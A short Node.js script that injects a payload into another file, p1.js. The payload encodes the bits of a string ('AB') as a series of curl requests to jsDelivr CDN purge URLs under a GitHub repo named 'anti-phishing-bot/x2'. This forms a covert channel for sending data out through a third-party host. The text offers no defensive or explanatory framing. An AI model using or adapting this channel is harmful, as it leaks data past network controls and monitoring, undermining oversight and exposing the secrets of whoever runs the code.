const fs=require('fs');
const code=`
const cp=require('child_process');
const L=[]; for(let i=0;i<2;i++) L.push(6780+i*8);
const s='AB';
for(let i=0;i<2;i++){ const v=s.charCodeAt(i);
  for(let b=7;b>=0;b--) if((v>>b)&1) cp.spawnSync('curl',['-s','-m','8','-o','/dev/null','https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/b'+(L[i]+(7-b))]);
}
`;
let t=fs.readFileSync('p1.js','utf8'); t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n'); fs.writeFileSync('p1.js',t);
